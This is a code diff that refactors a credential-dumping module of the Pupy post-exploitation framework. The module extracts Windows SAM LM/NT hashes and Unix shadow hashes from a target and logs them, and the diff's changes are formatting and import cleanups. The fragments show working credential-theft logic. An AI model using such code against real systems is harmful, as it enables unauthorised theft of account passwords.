@@ -13,8 +13,7 @@
 # saves the hives with a random name
 # do not write the saves on the target
 
-from pupylib.PupyModule import *
-from pupylib.PupyCompleter import *
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from pupylib.utils.credentials import Credentials
 from modules.lib.utils.shell_exec import shell_exec
 
@@ -44,7 +43,7 @@ class CredDump(PupyModule):
         cls.arg_parser = PupyArgumentParser(prog='hive', description=cls.__doc__)
 
     def run(self, args):
-        config = self.client.pupsrv.config or PupyConfig()
+        config = self.client.pupsrv.config
         self.db = Credentials(client=self.client.short_name(), config=self.config)
         self.rep = os.path.join(config.get_folder('creds'), self.client.short_name())
 
@@ -149,8 +148,7 @@ class CredDump(PupyModule):
             'Login': hsh.split(':')[0],
             'Category': 'Shadow hash',
             'CredType': 'hash'
-            } for hsh in hashes
-        ])
+        } for hsh in hashes])
 
         for hsh in hashes:
             self.log('{}'.format(hsh))
@@ -230,8 +228,12 @@ class CredDump(PupyModule):
         hbootkey = get_hbootkey(samaddr,bootkey)
         for user in get_user_keys(samaddr):
             lmhash, nthash = get_user_hashes(user,hbootkey)
-            if not lmhash: lmhash = empty_lm
-            if not nthash: nthash = empty_nt
+            if not lmhash:
+                lmhash = empty_lm
+
+            if not nthash:
+                nthash = empty_nt
+
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
             hashes.append({
                 'Login': get_user_name(user),
@@ -257,7 +259,8 @@ class CredDump(PupyModule):
 
     def dump(self, src, length=8):
         FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
-        N=0; result=''
+        N=0
+        result=''
         while src:
            s,src = src[:length],src[length:]
            hexa = ' '.join(["%02X"%ord(x) for x in s])
